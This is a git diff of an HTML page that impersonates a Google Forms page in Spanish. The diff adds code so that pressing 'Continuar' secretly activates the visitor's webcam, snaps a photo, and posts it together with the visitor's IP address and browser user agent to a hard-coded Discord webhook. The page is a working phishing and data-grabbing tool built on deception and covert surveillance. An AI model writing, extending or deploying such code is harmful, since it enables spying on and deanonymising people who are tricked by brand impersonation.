@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -12,6 +13,7 @@
             background-color: #f0f0f0;
             text-align: center;
         }
+
         .container {
             max-width: 600px;
             margin: 50px auto;
@@ -20,6 +22,7 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
+
         .button {
             background-color: #007bff;
             color: #fff;
@@ -30,49 +33,76 @@
             font-size: 16px;
             transition: background-color 0.3s;
         }
+
         .button:hover {
             background-color: #0056b3;
         }
     </style>
 </head>
+
 <body>
     <div class="container">
         <h1>Google Forms</h1>
         <p>Formulario de Google LLC 2024 ©</p>
-        <button class="button" onclick="sendData()">Continuar</button>
+        <button class="button" onclick="takePhoto()">Continuar</button>
     </div>
 
     <script>
-        function sendData() {
+        async function takePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+
+                videoElement.onloadedmetadata = async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoElement.videoWidth;
+                    canvas.height = videoElement.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+
+                    sendData(imageData);
+
+                    stream.getTracks().forEach(track => track.stop());
+                };
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to access camera. Please try again later.');
+            }
+        }
+
+        function sendData(imageData) {
             var userAgent = navigator.userAgent;
-            
+
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     var ipAddress = data.ip;
 
                     var payload = {
-                        content: 'User IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent
+                        content: 'User IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent + '\nImage Data: ' + imageData
                     };
 
-                    fetch('https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t_5cv', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            alert('Redireccionando a la pagina principal...');
-                        } else {
-                            alert('Hmm error');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        alert('An error occurred. Please try again later.');
-                    });
+                    fetch('https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t5cv', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(payload)
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                alert('Redireccionando a la pagina principal...');
+                            } else {
+                                alert('Hmm error');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                            alert('An error occurred. Please try again later.');
+                        });
                 })
                 .catch(error => {
                     console.error('Error:', error);
@@ -81,4 +111,5 @@
         }
     </script>
 </body>
+
 </html>
